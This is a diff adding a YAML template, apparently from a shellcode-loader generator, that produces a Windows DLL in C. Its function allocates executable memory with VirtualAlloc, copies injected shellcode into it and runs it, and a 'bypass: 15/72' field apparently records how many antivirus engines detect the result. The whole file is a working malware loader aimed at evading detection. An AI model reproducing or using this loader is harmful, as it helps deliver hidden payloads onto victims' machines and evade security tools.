@@ -1,0 +1,40 @@
+name: C-DLL-Windows-Null-Yes-MemoryEnforcement
+time: 1630383071
+bypass: 15/72
+language: c
+build: ~
+process: dll
+set:
+  shellcode: kwargs.get('shellcode') #表达式执行，分成多个段的话，后面看下jinja能不能支持
+include:
+  - '#include <windows.h>'
+  - '#include <stdio.h>'
+  - '#include <string.h>'
+pragma: ~
+define: ~
+class: ~
+function:
+  - |
+    int add()
+    {
+    LPVOID Memory;
+    unsigned char buf[] = "{{shellcode}}";
+    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, buf, sizeof(buf));
+    ((void(*)())Memory)();
+    return 0;
+    }
+    BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
+    {
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+    break;
+    }
+    return TRUE;
+    }
+    
+
